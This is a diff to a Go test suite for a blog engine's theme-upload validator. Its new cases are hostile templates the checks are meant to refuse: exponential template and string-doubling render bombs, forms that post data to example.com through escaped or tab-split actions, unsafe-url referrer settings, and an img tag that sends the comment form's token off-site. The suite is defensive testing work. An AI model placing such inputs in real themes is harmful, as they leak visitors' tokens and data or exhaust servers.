@@ -16,8 +16,10 @@ import (
 	"path"
 	"path/filepath"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
+	"time"
 
 	"sap13ns/internal/config"
 	"sap13ns/internal/media"
@@ -259,6 +261,20 @@ func TestThemeValidation(t *testing.T) {
 	for k, v := range homeWith(`{{template "l8" .}}`) {
 		laughs[k] = v
 	}
+	// Each level calls the one below in both branches: 2^28 template calls
+	// if the HTML checks inlined them all.
+	branches := map[string]string{"templates/partials/branches.html": func() string {
+		var b strings.Builder
+		b.WriteString(`{{define "b0"}}{{end}}`)
+		for i := 1; i <= 28; i++ {
+			below := `{{template "b` + strconv.Itoa(i-1) + `" .}}`
+			b.WriteString(`{{define "b` + strconv.Itoa(i) + `"}}{{if .}}` + below + `{{else}}` + below + `{{end}}{{end}}`)
+		}
+		return b.String()
+	}()}
+	for k, v := range homeWith(`{{template "b28" .}}`) {
+		branches[k] = v
+	}
 
 	cases := []struct {
 		name string
@@ -336,6 +352,7 @@ func TestThemeValidation(t *testing.T) {
 		{"nested silent loops", zipOf(t, "tiny", base, homeWith(`{{range .Posts}}{{range .Categories}}{{end}}{{end}}`)), "template.silent-loops"},
 		{"costly silent loop", zipOf(t, "tiny", base, homeWith(`{{range .Posts}}{{if contains .Content "x"}}{{end}}{{end}}`)), "template.silent-cost"},
 		{"exponential expansion", zipOf(t, "tiny", base, laughs), "template.too-big"},
+		{"exponential branches", zipOf(t, "tiny", base, branches), "template.too-big"},
 		{"missing template", zipOf(t, "tiny", base, homeWith(`{{template "nope" .}}`)), "template.missing"},
 		{"field typo", zipOf(t, "tiny", base, homeWith(`{{.Site.Titel}}`)), "template.field"},
 		{"parse error", zipOf(t, "tiny", base, homeWith(`{{if}}`)), "template.parse"},
@@ -375,10 +392,63 @@ func TestThemeValidation(t *testing.T) {
 		{"format from data", zipOf(t, "tiny", base, homeWith(`{{printf .Title 1}}`)), "template.format-literal"},
 		{"translation format from data", zipOf(t, "tiny", base, homeWith(`{{T .Title 1}}`)), "template.format-literal"},
 		{"plural width", zipOf(t, "tiny", base, homeWith(`{{plural .Total "%*d post" "%d posts"}}`)), "format.width"},
+		// The probe runs every page within the bounds of RenderContext.
+		{"probe doubling a text", zipOf(t, "tiny", base, homeWith(`{{$a := printf "%s%s" "abcdefgh" "abcdefgh"}}`+
+			strings.Repeat(`{{$a = printf "%s%s" $a $a}}`, 40)+`{{len $a}}`)), "template.render-limit"},
+		{"probe repeating an argument", zipOf(t, "tiny", base, homeWith(`{{$a := printf "%99s" "x"}}`+
+			strings.Repeat(`{{$a = printf "%[1]s%[1]s%[1]s%[1]s" $a}}`, 20)+`{{len $a}}`)), "template.render-limit"},
+		{"probe making too much text", zipOf(t, "tiny", base, homeWith(`{{$a := printf "%99s" "x"}}`+
+			strings.Repeat(`{{$a = printf "%[1]s%[1]s%[1]s%[1]s" $a}}`, 6)+strings.Repeat(`{{$b := upper $a}}`, 300))), "template.render-limit"},
+		{"lists holding themselves print short", zipOf(t, "tiny", base, homeWith(`{{$l := list 1}}`+
+			strings.Repeat(`{{$l = list $l $l}}`, 64)+`<p>{{$l}}</p>`)), ""},
+		// Forms.
+		{"form around the comments", zipOf(t, "tiny", base, homeWith(`<form action="/search">{{template "shared/comments" .}}</form>`)), "template.form-nested"},
+		{"form around the admin bar", zipOf(t, "tiny", base, layoutWith(`{{template "shared/admin-bar" .}}`, `<form action="/search">{{template "shared/admin-bar" .}}</form>`)), "template.form-nested"},
+		{"form in a partial around the comments", zipOf(t, "tiny", base, map[string]string{
+			"templates/partials/f.html": `{{define "tiny/open"}}<form action="/search">{{end}}`,
+			"templates/home.html":       `{{define "content"}}{{template "tiny/open"}}{{template "shared/comments" .}}</form>{{end}}`}), "template.form-nested"},
+		{"select around the comments", zipOf(t, "tiny", base, homeWith(`<select name="s">{{template "shared/comments" .}}</select>`)), "template.form-nested"},
+		{"form closed inside a select", zipOf(t, "tiny", base, homeWith(`<form action="/search"><select name="s"></form></select>{{template "shared/comments" .}}`)), "template.form-nested"},
+		{"comments after a closed form", zipOf(t, "tiny", base, homeWith(`<form action="/search"><input name="q"></form>{{template "shared/comments" .}}`)), ""},
+		{"off-site form", zipOf(t, "tiny", base, homeWith(`<form action="https://example.com/collect"><button>Go</button></form>`)), "template.form-action"},
+		{"protocol-relative form", zipOf(t, "tiny", base, homeWith(`<form action="//example.com/collect"><button>Go</button></form>`)), "template.form-action"},
+		{"form escaped off-site", zipOf(t, "tiny", base, homeWith(`<form action="/&#47;example.com/collect"><button>Go</button></form>`)), "template.form-action"},
+		{"form off-site through a tab", zipOf(t, "tiny", base, homeWith("<form action=\"/\t/example.com/collect\"><button>Go</button></form>")), "template.form-action"},
+		{"form action from the data", zipOf(t, "tiny", base, homeWith(`<form action="{{.Canonical}}"><button>Go</button></form>`)), "template.form-action"},
+		{"form action after a slash", zipOf(t, "tiny", base, homeWith(`<form action="/{{.Title}}"><button>Go</button></form>`)), "template.form-action"},
+		{"form action of a link to another site", zipOf(t, "tiny", base, homeWith(`<form action="{{link "//example.com"}}"><button>Go</button></form>`)), "template.form-action"},
+		{"form to a path of the site", zipOf(t, "tiny", base, homeWith(`<form action="/search"><button>Go</button></form><form action="{{link "/search"}}?x=1"></form>`)), ""},
+		// The referrer.
+		{"referrerpolicy", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" referrerpolicy="unsafe-url">x</a>`)), "template.referrer"},
+		{"meta referrer", zipOf(t, "tiny", base, homeWith(`<meta name="referrer" content="unsafe-url">`)), "template.referrer"},
+		{"meta referrer in noscript", zipOf(t, "tiny", base, homeWith(`<noscript><meta name="Referrer" content="unsafe-url"></noscript>`)), "template.referrer"},
+		{"meta named by an action", zipOf(t, "tiny", base, homeWith(`<meta name="{{.Title}}" content="unsafe-url">`)), "template.meta-name"},
+		{"rel opener", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" target="_blank" rel="noreferrer opener">x</a>`)), "template.rel"},
+		{"rel from an action", zipOf(t, "tiny", base, homeWith(`<a href="https://example.com/" rel="{{.Title}}">x</a>`)), "template.rel"},
+		// Foreign content, which the checks' tokenizer does not read as a
+		// browser does.
+		{"svg title", zipOf(t, "tiny", base, homeWith(`<svg><title><form method="post" action="/x"></form></title></svg>`)), "template.svg"},
+		{"svg foreignObject", zipOf(t, "tiny", base, homeWith(`<svg><foreignObject><div></div></foreignObject></svg>`)), "template.svg"},
+		{"svg leaving through an end tag", zipOf(t, "tiny", base, homeWith(`<svg></p><path d="M0 0"/></svg>`)), "template.svg"},
+		{"shared template in svg", zipOf(t, "tiny", base, homeWith(`<svg>{{template "shared/theme-toggle"}}</svg>`)), "template.svg"},
+		{"math", zipOf(t, "tiny", base, homeWith(`<math><mi>x</mi></math>`)), "template.element"},
+		{"inline svg drawing", zipOf(t, "tiny", base, homeWith(`<svg viewBox="0 0 24 24" aria-hidden="true"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>`+
+			`<g><path d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="4"/><text x="1" y="2">{{.Title}}</text></g></svg>`)), ""},
+		// Tokens.
+		{"comment token", zipOf(t, "tiny", base, homeWith(`{{with .CommentForm}}<img src="https://example.com/?t={{.Token}}" alt="">{{end}}`)), "template.secret"},
+		{"token placeholder", zipOf(t, "tiny", base, homeWith(`<img src="https://example.com/?t=sap-ctoken-1" alt="">`)), "template.token"},
+		{"token placeholder in an action", zipOf(t, "tiny", base, homeWith(`<img src="https://example.com/?t={{printf "sap-ftoken-%s" "x.y"}}" alt="">`)), "template.token"},
+		{"token placeholder in a translation", zipOf(t, "tiny", base, map[string]string{"i18n/es.json": `{"Main menu": "sap-ctoken-1"}`}), "template.token"},
+		{"plugin form placeholder", zipOf(t, "tiny", base, homeWith(`<form action="/search"><div data-form="contact.form"></div></form>`)), "template.token"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
+			start := time.Now()
 			res, err := install(m, c.pkg, nil)
+			// The probe stops a page that blows up within its bounds.
+			if took := time.Since(start); took > theme.RenderTimeout {
+				t.Errorf("the checks took %s", took)
+			}
 			if c.want == "" {
 				if err != nil {
 					t.Fatalf("refused: %v", err)
@@ -531,6 +601,11 @@ func TestThemeUploadFlow(t *testing.T) {
 	if b := rec.Body.String(); rec.Code != http.StatusOK || !strings.Contains(b, "tiny-one") || !strings.Contains(b, theme.CreditMarker) {
 		t.Fatalf("preview: %d", rec.Code)
 	}
+	// The admin bar's form, with the CSRF token, first ends any form a
+	// theme left open.
+	if b := rec.Body.String(); !strings.Contains(b, `</select></form><form method="post" action="/logout"><input type="hidden" name="csrf"`) {
+		t.Fatal("the admin bar does not end an open form before its own")
+	}
 	// Activate.
 	if rec := e.admin("/admin/appearance/themes/tiny/activate", url.Values{}); rec.Code != http.StatusSeeOther {
 		t.Fatalf("activate: %d", rec.Code)
@@ -616,10 +691,19 @@ func TestThemeUploadFlow(t *testing.T) {
 	}
 
 	// A theme that passes the checks but writes more than the output
-	// limit: a 500 and a log line, not the page.
+	// limit: a 500 and a log line, not the page. (Without page data, as
+	// the checks' probe runs it, it writes nothing: a page that is too big
+	// without data is refused at upload.)
 	huge := tinyTheme("huge")
 	huge["templates/partials/big.html"] = `{{define "huge/big"}}` + strings.Repeat("0123456789abcdef", 200<<10/16) + `{{end}}`
-	huge["templates/home.html"] = `{{define "content"}}` + strings.Repeat(`{{template "huge/big"}}`, 50) + `{{end}}`
+	huge["templates/home.html"] = `{{define "content"}}{{if .Site}}` + strings.Repeat(`{{template "huge/big"}}`, 50) + `{{end}}{{end}}`
+	tooBig := tinyTheme("too-big")
+	tooBig["templates/partials/big.html"] = huge["templates/partials/big.html"]
+	tooBig["templates/home.html"] = `{{define "content"}}` + strings.Repeat(`{{template "huge/big"}}`, 50) + `{{end}}`
+	if rec := e.uploadTheme("too-big.zip", zipOf(t, "too-big", tooBig, nil)); rec.Code != http.StatusUnprocessableEntity ||
+		!strings.Contains(rec.Body.String(), "goes over the limits of uploaded themes") {
+		t.Fatalf("too big without data: %d", rec.Code)
+	}
 	if rec := e.uploadTheme("huge.zip", zipOf(t, "huge", huge, nil)); rec.Code != http.StatusSeeOther {
 		t.Fatalf("huge: %d %s", rec.Code, rec.Body)
 	}
